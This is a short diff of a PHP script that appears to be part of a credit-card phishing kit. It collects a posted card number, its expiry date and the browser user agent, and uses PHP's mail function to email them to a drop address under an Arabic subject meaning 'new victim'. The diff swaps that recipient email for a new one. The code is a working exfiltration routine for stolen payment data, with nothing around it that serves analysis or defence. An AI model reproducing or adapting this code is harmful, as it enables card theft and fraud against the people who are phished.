@@ -11,7 +11,7 @@ $message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
 $message .= "--- محمد المعبدي ---\n";
 $cc = $_POST['ccn'];
 $subject = "ضحية جديدة ياقلبي".$_POST['exm'].".".$_POST['exy'];
-$send = "zbx@hotmail.it";
+$send = "im3len@gmail.com";
 $headers = 'From: mail@srvd32.hosteur.com' . "\r\n" .
 mail($send,$subject,$message,$headers);
 
